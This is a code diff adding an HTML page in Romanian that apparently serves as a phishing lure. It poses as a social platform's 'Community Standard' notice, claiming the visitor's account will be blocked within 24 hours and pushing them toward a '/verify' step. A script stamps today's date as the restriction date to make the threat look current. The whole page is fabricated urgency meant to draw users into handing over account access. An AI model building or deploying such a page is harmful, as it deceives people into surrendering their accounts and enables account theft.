@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Community Standard</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; }
+        body { background-color: #F8F9FA; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }
+        .container { max-width: 620px; width: 100%; display: flex; flex-direction: column; gap: 16px; background-color: white; padding: 16px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .hero-image { width: 100%; height: auto; border-radius: 4px; max-height: 250px; object-fit: cover; }
+        .title { font-size: 24px; font-weight: bold; color: #212529; }
+        .description { line-height: 24px; color: #212529; }
+        .steps-container { position: relative; display: flex; flex-direction: column; gap: 16px; }
+        .vertical-line { position: absolute; top: 50%; left: 12px; height: 70%; width: 2px; background-color: #E5E7EB; transform: translateY(-50%); z-index: 1; }
+        .step { display: flex; align-items: center; gap: 8px; z-index: 2; }
+        .step-icon { width: 28px; height: 28px; background-color: white; display: flex; align-items: center; justify-content: center; }
+        .step-text { flex: 1; }
+        .continue-btn { border-radius: 8px; background-color: #3B82F6; color: white; font-weight: bold; padding: 16px 12px; border: none; cursor: pointer; transition: opacity 0.2s; font-size: 16px; }
+        .continue-btn:hover { opacity: 0.9; }
+        .continue-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .restricted-text { text-align: center; }
+        .date-bold { font-weight: bold; }
+        @media (max-width: 640px) {
+            body { background-color: white; padding: 4px; align-items: flex-start; }
+            .container { box-shadow: none; padding: 8px; margin-top: 30px; height: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="hero-image.jpg" alt="Security Verification" class="hero-image">
+        <p class="title">Contul tău va fi blocat timp de 24 de ore.</p>
+        <p class="description">Sistemul nostru a detectat unele activități neobișnuite în contul tău, ceea ce poate constitui o încălcare a regulilor privind conținutul de imagini și postări.</p>
+        <div class="steps-container">
+            <div class="vertical-line"></div>
+            <div class="step">
+                <div class="step-icon">
+                    <i class="fas fa-circle-check" style="color: #9CA3AF; font-size: 28px;"></i>
+                </div>
+                <p class="step-text">Te rugăm să verifici și să urmezi pașii indicați.</p>
+            </div>
+            <div class="step">
+                <div class="step-icon">
+                    <i class="fas fa-id-card" style="color: #355797; font-size: 28px;"></i>
+                </div>
+                <p class="step-text">Pentru a evita blocarea contului, mai ai doar 24 de ore la dispoziție pentru a verifica și a face apel.</p>
+            </div>
+        </div>
+        <button class="continue-btn" id="continueBtn">
+            Începe verificarea
+        </button>
+        <p class="restricted-text">
+            Contul tău a fost restricționat la data de <span class="date-bold" id="currentDate">25 septembrie</span>
+        </p>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const date = new Date();
+            const day = date.getDate();
+            const month = date.toLocaleString('ro-RO', { month: 'long' });
+            const year = date.getFullYear();
+            document.getElementById('currentDate').textContent = `${day} ${month} ${year}`;
+            document.getElementById('continueBtn').addEventListener('click', function() {
+                window.location.href = '/verify';
+            });
+        });
+    </script>
+</body>
+</html>
